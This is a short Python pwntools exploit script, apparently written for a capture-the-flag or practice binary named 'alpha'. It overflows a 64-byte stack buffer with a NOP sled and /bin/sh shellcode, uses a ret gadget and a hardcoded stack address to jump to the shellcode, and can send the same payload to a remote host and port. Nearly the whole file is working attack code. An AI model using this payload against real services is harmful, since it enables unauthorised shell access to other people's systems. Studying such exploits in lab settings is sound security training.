#!/usr/bin/env python3

from pwn import *


context.binary = elf = ELF("./alpha", checksec=False)
context.terminal = ["tmux", "splitw", "-h"]


def start(argv=None, *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + (argv or []), gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT), *a, **kw)
    return process([elf.path] + (argv or []), *a, **kw)


gdbscript = """
set disassembly-flavor intel
break *vulnerable
break *runshell
continue
"""


def main():
    io = start()

    offset = 0x40
    rop = ROP(elf)

    #Shellcode to run /bin/sh
    shellcode = asm(shellcraft.sh())
    if len(shellcode) > 64:  # Check if the shellcode fits in the buffer
        log.error("Shellcode is too large to fit in the buffer")
        log.error(f"Shellcode size: {len(shellcode)} bytes")
    shellcode_address = 0x7fffffffd580  # Address on the stack to write the shellcode
    ret_gadget = rop.find_gadget(["ret"])[0]

    # Write the shellcode to the stack and jump to it
    off = b'\x90' * (offset - len(shellcode))  # NOP sled to fill the buffer
    payload = flat(
        off,
        shellcode,
        p64(ret_gadget),  # Align the stack
        p64(shellcode_address)  # Jump to the shellcode
    )
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()